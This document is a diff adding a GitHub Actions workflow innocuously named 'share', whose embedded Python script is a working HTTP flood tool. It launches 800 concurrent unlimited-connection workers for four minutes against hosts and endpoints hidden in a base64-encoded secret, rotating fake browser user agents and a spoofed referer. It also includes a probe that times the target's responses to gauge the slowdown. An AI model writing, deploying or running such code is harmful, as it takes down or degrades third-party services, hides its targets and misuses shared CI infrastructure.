@@ -1,0 +1,83 @@
+name: share
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: run
+        env:
+          SHARE_A: ${{ secrets.SHARE_A }}
+          N: "800"
+          DUR: "240"
+        run: |
+          python3 -m pip install --quiet aiohttp 2>/dev/null || pip install --quiet aiohttp
+          python3 - <<'PY'
+          import asyncio, aiohttp, base64, json, os, random, time
+
+          CFG = json.loads(base64.b64decode(os.environ["SHARE_A"]).decode())
+          HOSTS = CFG["hosts"]
+          EPS = CFG["eps"]
+          REF = CFG["ref"]
+
+          N = int(os.environ.get("N", "800"))
+          DUR = int(os.environ.get("DUR", "240"))
+
+          UAS = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+          ]
+
+          def H():
+              return {"User-Agent": random.choice(UAS),
+                      "Accept": "application/json, text/plain, */*",
+                      "Accept-Language": "zh-CN,zh;q=0.9",
+                      "Cache-Control": "no-cache",
+                      "Referer": REF}
+
+          deadline = time.time() + DUR
+          TO = aiohttp.ClientTimeout(total=15, sock_read=15)
+          hits = {"a": 0, "b": 0, "c": 0}
+
+          async def worker(sess):
+              while time.time() < deadline:
+                  i = random.randrange(len(EPS))
+                  try:
+                      async with sess.get(random.choice(HOSTS) + EPS[i], headers=H(),
+                                          timeout=TO, allow_redirects=False) as r:
+                          await r.read()
+                      hits["abc"[i]] += 1
+                  except Exception:
+                      pass
+
+          async def probe():
+              while time.time() < deadline:
+                  t0 = time.time()
+                  try:
+                      async with aiohttp.ClientSession(timeout=TO) as s:
+                          async with s.get(random.choice(HOSTS) + EPS[0], headers=H()) as r:
+                              await r.read()
+                  except Exception:
+                      pass
+                  print(f"P ms={int((time.time()-t0)*1000)} at {time.strftime('%H:%M:%S')}", flush=True)
+                  await asyncio.sleep(20)
+
+          async def report():
+              while time.time() < deadline:
+                  print(f"C a={hits['a']} b={hits['b']} c={hits['c']} at {time.strftime('%H:%M:%S')}", flush=True)
+                  await asyncio.sleep(20)
+
+          async def main():
+              conn = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=30, keepalive_timeout=5)
+              async with aiohttp.ClientSession(connector=conn, timeout=TO) as s:
+                  await asyncio.gather(*(worker(s) for _ in range(N)), probe(), report())
+              print(f"C FINAL a={hits['a']} b={hits['b']} c={hits['c']}", flush=True)
+              print(f"done at {time.strftime('%H:%M:%S')}", flush=True)
+
+          asyncio.run(main())
+          PY
